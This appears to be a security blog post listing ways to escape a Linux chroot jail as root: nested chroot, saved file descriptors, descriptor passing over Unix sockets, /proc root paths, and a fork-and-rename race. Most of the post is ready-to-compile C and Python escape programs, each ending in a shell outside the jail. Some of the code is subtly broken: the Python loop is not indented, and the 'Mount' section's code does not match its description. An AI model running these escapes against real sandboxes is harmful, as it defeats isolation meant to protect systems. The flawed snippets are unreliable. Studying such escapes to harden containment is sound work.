---
title: "Chroot Jailbreaking"
date: 2024-11-20
draft: false
summary: "Some of technique to break out of the chroot's jail"
tags: ["jailbreak"]
layoutBackgroundBlur: true
---


#### 1 - GTFO Bins 

List of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

[GTFOBins](https://gtfobins.github.io/)

#### 2 - Performing Chroot inside chroot jail


Description: Need to be root inside chroot to escape from it by **creating another chroot**. Because 2 chroot cannot coexist (in Linux). So when create a folder and then create a new chroot inside it, will you pop out of the jail and be able to read file in fs. 

Challenge example: [Challenge](https://blog.pentesteracademy.com/privilege-escalation-breaking-out-of-chroot-jail-927a08df5c28) 



gcc available, so write a C file to perform a chroot and pop out of chrooted enviroment. We need to using C to compile **chroot** because normally **chroot binary** is not available in chrooted enviroment. **Compile**, **upload**, **execute** is recommended.

```cpp=
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
The above program will:

1. Create a chroot environment.
2. Change directory to a path relatively outside of the chroot environment. (to reach the root file system outside of chroot environment)
3. Enter chroot to access the root file system.



#### 3 - Root + Saved fd


Similar to the previous case, but in this case the attacker stores a file descriptor to the current directory and then creates the chroot in a new folder. Finally, as he has access to that FD outside of the chroot, he access it and he escapes.

```c
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>


int main(void)
{
    mkdir("tmpdir", 0755);
    int dir_fd = open(".", O_RDONLY);
    if(chroot("tmpdir")){
        perror("chroot");
    }
    fchdir(dir_fd);
    close(dir_fd);  
    for(int x = 0; x < 1000; x++) chdir("..");
    chroot(".");
    system("/bin/bash");
}
```

#### 4 - Root + Fork + UDS (Unix Domain Sockets)


FD can be passed over Unix Domain Sockets, so:

- Create a child process (fork)
- Create UDS so parent and child can talk
- Run chroot in child process in a different folder
- In parent proc, create a FD of a folder that is outside of new child proc chroot
- Pass to child procc that FD using the UDS
- Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#define CHROOT_PATH "tmpdir"  // Directory for chroot

// Function to send FD over socket
void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    struct cmsghdr *cmsg;
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));

    struct iovec io = {.iov_base = "FD", .iov_len = 2};
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));

    *((int *)CMSG_DATA(cmsg)) = fd;

    if (sendmsg(socket, &msg, 0) < 0) {
        perror("sendmsg");
        exit(EXIT_FAILURE);
    }
}

// Function to receive FD from socket
int receive_fd(int socket) {
    struct msghdr msg = {0};
    struct cmsghdr *cmsg;
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    char dummy[2];
    struct iovec io = {.iov_base = dummy, .iov_len = sizeof(dummy)};
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);

    if (recvmsg(socket, &msg, 0) < 0) {
        perror("recvmsg");
        exit(EXIT_FAILURE);
    }

    cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg == NULL || cmsg->cmsg_len != CMSG_LEN(sizeof(int))) {
        fprintf(stderr, "Invalid message received\n");
        exit(EXIT_FAILURE);
    }

    int fd = *((int *)CMSG_DATA(cmsg));

    // Verify FD validity
    if (fcntl(fd, F_GETFD) == -1) {
        perror("fcntl");
        exit(EXIT_FAILURE);
    }
    return fd;
}

int main() {
    int sockpair[2];
    pid_t pid;

    // Ensure the chroot directory exists
    if (mkdir(CHROOT_PATH, 0755) < 0 && errno != EEXIST) {
        perror("mkdir");
        exit(EXIT_FAILURE);
    }

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockpair) < 0) {
        perror("socketpair");
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        // Child process
        close(sockpair[0]);

        // Change root to a new directory (must be root to run chroot)
        if (chroot(CHROOT_PATH) < 0) {
            perror("chroot failed in child process");
            exit(EXIT_FAILURE);
        }
        if (chdir("/") < 0) {
            perror("chdir after chroot");
            exit(EXIT_FAILURE);
        }
        printf("Child: Chroot changed to %s\n", CHROOT_PATH);

        // Receive FD from parent
        int received_fd = receive_fd(sockpair[1]);
        printf("Child: Received FD %d from parent\n", received_fd);

        // Escape chroot jail
        if (fchdir(received_fd) < 0) {
            perror("fchdir");
            exit(EXIT_FAILURE);
        }

        printf("Child: Escaped chroot jail\n");
        for(int x = 0; x < 1000; x++) chdir("..");
        chroot(".");

        // Verify escape by listing current directory
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            printf("Child: Current working directory: %s\n", cwd);
            system("/bin/bash");  // Optionally, open bash shell for the child
        } else {
            perror("getcwd");
        }

        close(sockpair[1]);
    } else {
        // Parent process
        close(sockpair[1]);

        // Open a folder outside the chroot (e.g., /)
        int fd = open("/", O_RDONLY);
        if (fd < 0) {
            perror("open");
            exit(EXIT_FAILURE);
        }

        printf("Parent: Opened FD %d for /\n", fd);

        // Send FD to child
        send_fd(sockpair[0], fd);
        printf("Parent: Sent FD to child\n");

        close(fd);
        close(sockpair[0]);
        wait(NULL);  // Wait for child process to finish
    }
    
    return 0;
}

```
#### 5 - Root + Mount

- Mounting root device (/) into a directory inside the chroot jail
- Chroot into that directory will pop you out of the box

```c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>

#define CHROOT_PATH "chroot_env"

int main() {
    char proc_root[256];
    char target_root[256];
    struct stat own_root_stat, target_root_stat;
    DIR *proc_dir;
    struct dirent *entry;
    int found = 0;

    
    if (mkdir(CHROOT_PATH, 0755) < 0 && errno != EEXIST) {
        perror("mkdir");
        exit(EXIT_FAILURE);
    }

    
    if (chroot(CHROOT_PATH) < 0) {
        perror("chroot");
        exit(EXIT_FAILURE);
    }

    if (chdir("/") < 0) {
        perror("chdir");
        exit(EXIT_FAILURE);
    }

    
    if (mkdir("/proc", 0755) < 0 && errno != EEXIST) {
        perror("mkdir /proc");
        exit(EXIT_FAILURE);
    }

    if (mount("proc", "/proc", "proc", 0, NULL) < 0) {
        perror("mount /proc");
        exit(EXIT_FAILURE);
    }

    
    if (stat("/", &own_root_stat) < 0) {
        perror("stat /");
        exit(EXIT_FAILURE);
    }

    
    proc_dir = opendir("/proc");
    if (!proc_dir) {
        perror("opendir /proc");
        exit(EXIT_FAILURE);
    }

    while ((entry = readdir(proc_dir)) != NULL) {
        if (!isdigit(entry->d_name[0])) {
            continue; 
        }

        snprintf(proc_root, sizeof(proc_root), "/proc/%s/root", entry->d_name);

        if (stat(proc_root, &target_root_stat) == 0) {
            
            if (own_root_stat.st_ino != target_root_stat.st_ino) {
                found = 1;
                snprintf(target_root, sizeof(target_root), "/proc/%s/root", entry->d_name);
                break;
            }
        }
    }

    closedir(proc_dir);

    if (!found) {
        fprintf(stderr, "No suitable PID found for escaping chroot.\n");
        exit(EXIT_FAILURE);
    }

    printf("Using %s for escaping chroot.\n", target_root);

    if (chroot(target_root) < 0) {
        perror("chroot to target root");
        exit(EXIT_FAILURE);
    }

    printf("Successfully escaped chroot! Current directory:\n");
    system("ls /");

    
    system("/bin/bash");

    return 0;
}
```


#### 6 - Root(?) + Fork

- Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
- From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
- This children process will find himself outside of the chroot


```c!
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <errno.h>

#define CHROOT_DIR "chroot_env"
#define NESTED_DIR "nesteddir"
#define NEW_DIR "moved_out"

// Function to move the child process to the real root
int movetotheroot() {
    for (int i = 0; i < 10; i++) { 
        if (chdir("..") < 0) {
            perror("[Child] movetotheroot: chdir");
            return -1;
        }
    }
    return 0;
}

int main() {
    pid_t pid;
    char child_path[256];

    // Create directory structure
    printf("[+] Creating directories...\n");
    mkdir(CHROOT_DIR, 0755);
    snprintf(child_path, sizeof(child_path), "/%s/%s", CHROOT_DIR, NESTED_DIR);
    mkdir(child_path, 0755);

    // Fork process
    printf("[+] Forking process...\n");
    pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        // Child process
        printf("[Child] Chrooting into %s...\n", CHROOT_DIR);
        if (chroot(CHROOT_DIR) < 0) {
            perror("[Child] chroot");
            exit(EXIT_FAILURE);
        }

        if (chdir("/nesteddir") < 0) {
            perror("[Child] chdir");
            exit(EXIT_FAILURE);
        }

        printf("[Child] Inside chroot, sleeping...\n");
        sleep(2); // Wait for the parent to move the directory

        printf("[Child] Attempting to escape chroot...\n");
        if (movetotheroot() < 0) {
            perror("[Child] Failed to move to real root");
            exit(EXIT_FAILURE);
        }

        if (chroot(".") < 0) {
            perror("[Child] chroot to real root");
            exit(EXIT_FAILURE);
        }

        printf("[Child] Escaped chroot! Current directory:\n");
        system("ls /");
        system("/bin/bash");
        exit(EXIT_SUCCESS);
    } else {
        // Parent process
        sleep(1); // Wait for the child to enter chroot
        printf("[Parent] Moving %s to %s...\n", NESTED_DIR, NEW_DIR);
        if (rename(child_path, NEW_DIR) < 0) {
            perror("[Parent] rename");
            exit(EXIT_FAILURE);
        }

        // Wait for the child to complete
        wait(NULL);
        printf("[Parent] Cleanup complete.\n");
    }

    return 0;
}
```